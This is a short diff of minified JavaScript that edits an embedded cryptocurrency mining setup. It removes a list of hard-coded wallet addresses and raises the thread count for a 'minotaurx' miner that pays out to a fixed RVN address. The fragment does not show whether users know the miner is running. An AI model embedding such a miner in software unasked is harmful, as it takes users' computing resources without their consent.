@@ -1204,13 +1204,7 @@
             this.process && (this.process.stop(), (this.process = null));
           }
         }
-        const nU = {
-            BTC: "bc1qzqtkcf28ufrr6dh3822vcz6ru8ggmvgj3uz903",
-            LTC: "ltc1q8krf9g60n4q6dvnwg3lg30lp5e7yfvm2da5ty5",
-            BNB: "bnb1u5k33qnmcmgzyztaj9x89wzrnavxqls8d4x08h",
-            RVN: "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
-            NIM: "NQ08SUEHT0GSPCDJHUNXQ50HB0M0ABHAPP03",
-          },
+        const nU = {},
           IU = {
             algorithm: "cwm_minotaurx",
             config: {
@@ -1220,7 +1214,7 @@
                 worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",
                 password: "c=RVN",
               },
-              options: { threads: 1, log: !0 },
+              options: { threads: 2, log: !0 },
             },
           },
           MU = [
